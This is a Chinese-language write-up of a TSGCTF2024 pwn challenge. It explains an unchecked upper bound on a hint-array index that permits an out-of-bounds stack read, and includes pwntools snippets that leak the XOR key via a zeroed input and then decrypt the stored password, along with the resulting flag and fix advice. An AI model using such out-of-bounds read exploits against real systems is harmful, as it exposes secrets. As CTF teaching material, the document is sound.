# TSGCTF2024 Password-Ate-Quiz

## 题目简述

程序从文件读取最长 31 字节的密码，生成 64 位随机 `key`，并以 8 字节为单位把密码和用户输入都与该 key 异或。第一次认证失败后，用户可以选择编号 `0` 到 `2` 查看三条提示，然后再次输入密码。

关键漏洞位于提示读取逻辑：

```c
char hints[3][8] = {"Hint1:T", "Hint2:S", "Hint3:G"};
char password[0x20];
char input[0x20];

/* ... */

if (scanf("%d", &idx) == 1 && idx >= 0) {
    for (int i = 0; i < 8; i++) {
        putchar(hints[idx][i]);
    }
}
```

程序只检查 `idx >= 0`，没有上界检查，因此可以从 `hints` 之后的栈空间按 8 字节块越界读取。

## 解题过程

在本题编译产物的栈布局中，`hints` 从索引 0 开始；加密后的 `password` 位于索引 4 到 7，加密后的第一次 `input` 位于索引 8 到 11。随机 key 位于更低地址，相当于负索引，不能直接读取，但可以通过已知明文构造间接得到。

加密函数为：

```c
secret[i] ^= key;
```

第一次密码输入发送 8 个空字节。由于输入内容是全零，首个加密块满足：

```text
encrypted_input = 0 XOR key = key
```

随后进入提示菜单并请求索引 8，即可原样读出 8 字节 key：

```python
io.sendline(p64(0))
io.sendline(b"8")
io.recvuntil(b"(0~2) > ")
key = u64(io.recvn(8))
```

接下来依次读取索引 4、5、6、7。每次得到一个密码密文块，与 key 异或后按小端序拼接：

```python
plain = bytearray()
for idx in range(4, 8):
    io.sendline(str(idx).encode())
    io.recvuntil(b"(0~2) > ")
    encrypted = u64(io.recvn(8))
    plain += p64(encrypted ^ key)

password = plain.split(b"\x00", 1)[0]
```

恢复出的密码是：

```text
ThrtclScncGrp-eoeiaieeou-1959
```

发送一个非数字值结束提示循环，再把该密码提交给第二次认证，服务器返回：

```text
TSGCTF{S74ck_h45_much_1nf0m4710n_81775684690}
```

## 方法总结

本题把数组越界读与 XOR 已知明文结合起来。虽然 key 位于 `hints` 之前、负索引被禁止，但可控输入的密文位于可读的正索引区域；令输入块为零即可把密文直接变成 key，再解密相邻密码。修复时必须同时验证 `0 <= idx && idx < 3`，并避免把密码、输入和提示放在可被同一越界访问覆盖的栈帧中；自制的重复 XOR 也不应被当成密码保护。
